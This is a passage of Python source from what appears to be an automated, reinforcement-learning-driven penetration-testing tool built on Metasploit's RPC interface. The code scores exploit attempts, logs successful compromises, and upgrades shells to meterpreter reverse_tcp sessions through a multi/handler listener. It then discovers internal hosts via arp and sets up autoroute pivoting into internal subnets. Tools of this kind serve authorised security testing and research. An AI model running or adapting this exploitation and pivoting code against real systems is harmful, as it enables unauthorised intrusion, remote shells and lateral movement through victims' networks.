                                                          thread_name + '.csv'), 'a', 'utf-8') as fout:
                                bingo = [self.util.get_current_date(),
                                         self.rhost,
                                         session_port,
                                         self.source_host,
                                         target_info['protocol'],
                                         target_info['prod_name'],
                                         str(target_info['version']),
                                         vuln_name,
                                         description,
                                         session_type,
                                         session_exploit,
                                         target,
                                         session_payload,
                                         reference]
                                writer = csv.writer(fout)
                                writer.writerow(bingo)

                        # Shutdown multi-handler for post-exploitation.
                        # if server_job_id is not None:
                        #     self.client.stop_job(server_job_id)

                        # Disconnect session.
                        if thread_type == 'learning':
                            self.client.stop_session(session_id)
                            # self.client.stop_session(new_session_id)
                            self.client.stop_meterpreter_session(session_id)
                            # self.client.stop_meterpreter_session(new_session_id)
                        # Create session list for post-exploitation.
                        else:
                            # self.client.stop_session(new_session_id)
                            # self.client.stop_meterpreter_session(new_session_id)
                            session_list['id'] = session_id
                            session_list['type'] = session_type
                            session_list['port'] = session_port
                            session_list['exploit'] = session_exploit
                            session_list['target'] = target
                            session_list['payload'] = session_payload
                        break
                else:
                    # Failure exploitation.
                    reward = R_BAD
                    message = 'failure '
            else:
                # Failure exploitation.
                reward = R_BAD
                message = 'failure '
        else:
            # Time out or internal error of Metasploit.
            done = True
            reward = R_BAD
            message = 'time out'

        # Output result to console.
        if thread_type == 'learning':
            self.util.print_message(OK, '{0:04d}/{1:04d} : {2:03d}/{3:03d} {4} reward:{5} {6} {7} ({8}/{9}) '
                                        '{10} | {11} | {12} | {13}'.format(frame,
                                                                           MAX_TRAIN_NUM,
                                                                           step,
                                                                           MAX_STEPS,
                                                                           thread_name,
                                                                           str(reward),
                                                                           message,
                                                                           self.rhost,
                                                                           target_info['protocol'],
                                                                           target_info['port'],
                                                                           target_info['prod_name'],
                                                                           target_info['exploit'],
                                                                           selected_payload,
                                                                           target))
        else:
            self.util.print_message(OK, '{0}/{1} {2} {3} ({4}/{5}) '
                                        '{6} | {7} | {8} | {9}'.format(step+1,
                                                                       self.max_attempt,
                                                                       message,
                                                                       self.rhost,
                                                                       target_info['protocol'],
                                                                       target_info['port'],
                                                                       target_info['prod_name'],
                                                                       target_info['exploit'],
                                                                       selected_payload,
                                                                       target))

        # Set next stage of exploitation.
        targets_num = 0
        if thread_type == 'learning' and len(target_list) != 0:
            targets_num = random.randint(0, len(target_list) - 1)
        self.state[ST_TARGET] = targets_num
        '''
        if thread_type == 'learning' and len(target_list) != 0:
            if reward == R_BAD and self.state[ST_STAGE] == S_NORMAL:
                # Change status of target.
                self.state[ST_TARGET] = random.randint(0, len(target_list) - 1)
            elif reward == R_GOOD:
                # Change status of exploitation stage (Fix target).
                self.state[ST_STAGE] = S_EXPLOIT
            else:
                # Change status of post-exploitation stage (Goal).
                self.state[ST_STAGE] = S_PEXPLOIT
        '''

        return self.state, reward, done, session_list

    # Check possibility of post exploit.
    def check_post_exploit(self, session_id, session_type):
        new_session_id = 0
        status = False
        job_id = None
        if session_type == 'shell' or session_type == 'powershell':
            # Upgrade session from shell to meterpreter.
            upgrade_result, job_id, lport = self.upgrade_shell(session_id)
            if upgrade_result == 'success':
                sessions = self.client.get_session_list()
                session_list = list(sessions.keys())
                for sess_idx in session_list:
                    if session_id < sess_idx and sessions[sess_idx][b'type'].lower() == b'meterpreter':
                        status = True
                        new_session_id = sess_idx
                        break
            else:
                status = False
        elif session_type == 'meterpreter':
            status = True
        else:
            status = False
        return status, job_id, new_session_id

    # Check payload type.
    def check_payload_type(self, session_payload, session_type):
        status = None
        if session_type == 'shell' or session_type == 'powershell':
            # Check type: singles, stagers, stages
            if session_payload.count('/') > 1:
                # Stagers, Stages.
                status = True
            else:
                # Singles.
                status = False
        elif session_type == 'meterpreter':
            status = True
        else:
            status = False
        return status

    # Execute post exploit.
    def execute_post_exploit(self, session_id, session_type):
        internal_ip_list = []
        if session_type == 'shell' or session_type == 'powershell':
            # Upgrade session from shell to meterpreter.
            upgrade_result, _, _ = self.upgrade_shell(session_id)
            if upgrade_result == 'success':
                sessions = self.client.get_session_list()
                session_list = list(sessions.keys())
                for sess_idx in session_list:
                    if session_id < sess_idx and sessions[sess_idx][b'type'].lower() == b'meterpreter':
                        self.util.print_message(NOTE, 'Successful: Upgrade.')
                        session_id = sess_idx

                        # Search other servers in internal network.
                        internal_ip_list, _ = self.get_internal_ip(session_id)
                        if len(internal_ip_list) == 0:
                            self.util.print_message(WARNING, 'Internal server is not found.')
                        else:
                            # Pivoting.
                            self.util.print_message(OK, 'Internal server list.\n{}'.format(internal_ip_list))
                            self.set_pivoting(session_id, internal_ip_list)
                        break
            else:
                self.util.print_message(WARNING, 'Failure: Upgrade session from shell to meterpreter.')
        elif session_type == 'meterpreter':
            # Search other servers in internal network.
            internal_ip_list, _ = self.get_internal_ip(session_id)
            if len(internal_ip_list) == 0:
                self.util.print_message(WARNING, 'Internal server is not found.')
            else:
                # Pivoting.
                self.util.print_message(OK, 'Internal server list.\n{}'.format(internal_ip_list))
                self.set_pivoting(session_id, internal_ip_list)
        else:
            self.util.print_message(WARNING, 'Unknown session type: {}.'.format(session_type))
        return internal_ip_list

    # Upgrade session from shell to meterpreter.
    def upgrade_shell(self, session_id):
        # Upgrade shell session to meterpreter.
        self.util.print_message(NOTE, 'Upgrade session from shell to meterpreter.')
        payload = ''
        # TODO: examine payloads each OS systems.
        if self.os_real == 0:
            payload = 'windows/meterpreter/reverse_tcp'
        elif self.os_real == 3:
            payload = 'osx/x64/meterpreter_reverse_tcp'
        else:
            payload = 'linux/x86/meterpreter_reverse_tcp'

        # Launch multi handler.
        module = 'exploit/multi/handler'
        lport = random.randint(10001, 65535)
        option = {'LHOST': self.lhost, 'LPORT': lport, 'PAYLOAD': payload, 'TARGET': 0}
        job_id, uuid = self.client.execute_module('exploit', module, option)
        time.sleep(0.5)
        if uuid is None:
            self.util.print_message(FAIL, 'Failure executing module: {}'.format(module))
            return 'failure', job_id, lport

        # Execute upgrade.
        status = self.client.upgrade_shell_session(session_id, self.lhost, lport)
        return status, job_id, lport

    # Check status of running module.
    def check_running_module(self, job_id, uuid):
        # Waiting job to finish.
        time_count = 0
        while True:
            job_id_list = self.client.get_job_list()
            if job_id in job_id_list:
                time.sleep(1)
            else:
                return True
            if self.timeout == time_count:
                self.client.stop_job(str(job_id))
                self.util.print_message(WARNING, 'Timeout: job_id={}, uuid={}'.format(job_id, uuid))
                return False
            time_count += 1

    # Get internal ip addresses.
    def get_internal_ip(self, session_id):
        # Execute "arp" of Meterpreter command.
        self.util.print_message(OK, 'Searching internal servers...')
        cmd = 'arp\n'
        _ = self.client.execute_meterpreter(session_id, cmd)
        time.sleep(3.0)
        data = self.client.get_meterpreter_result(session_id)
        if (data is None) or ('unknown command' in data.lower()):
            self.util.print_message(FAIL, 'Failed: Get meterpreter result')
            return [], False
        self.util.print_message(OK, 'Result of arp: \n{}'.format(data))
        regex_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*[a-z0-9]{2}:[a-z0-9]{2}:[a-z0-9]{2}:[a-z0-9]{2}'
        temp_list = self.cutting_strings(regex_pattern, data)
        internal_ip_list = []
        for ip_addr in temp_list:
            if ip_addr != self.lhost:
                internal_ip_list.append(ip_addr)
        return list(set(internal_ip_list)), True

    # Get subnet masks.
    def get_subnet(self, session_id, internal_ip):
        cmd = 'run get_local_subnets\n'
        _ = self.client.execute_meterpreter(session_id, cmd)
        time.sleep(3.0)
        data = self.client.get_meterpreter_result(session_id)
        if data is not None:
            self.util.print_message(OK, 'Result of get_local_subnets: \n{}'.format(data))
            regex_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
            temp_subnet = self.cutting_strings(regex_pattern, data)
            try:
                subnets = temp_subnet[0].split('/')
                return [subnets[0], subnets[1]]
            except Exception as e:
                self.util.print_exception(e, 'Failed: {}'.format(cmd))
                return ['.'.join(internal_ip.split('.')[:3]) + '.0', '255.255.255.0']
        else:
            self.util.print_message(WARNING, '"{}" is failure.'.format(cmd))
            return ['.'.join(internal_ip.split('.')[:3]) + '.0', '255.255.255.0']

    # Set pivoting using autoroute.
    def set_pivoting(self, session_id, ip_list):
        # Get subnet of target internal network.
        temp_subnet = []
        for internal_ip in ip_list:
            # Execute an autoroute command.
            temp_subnet.append(self.get_subnet(session_id, internal_ip))

        # Execute autoroute.
        for subnet in list(map(list, set(map(tuple, temp_subnet)))):
            cmd = 'run autoroute -s ' + subnet[0] + ' ' + subnet[1] + '\n'
            _ = self.client.execute_meterpreter(session_id, cmd)
            time.sleep(3.0)
            _ = self.client.execute_meterpreter(session_id, 'run autoroute -p\n')
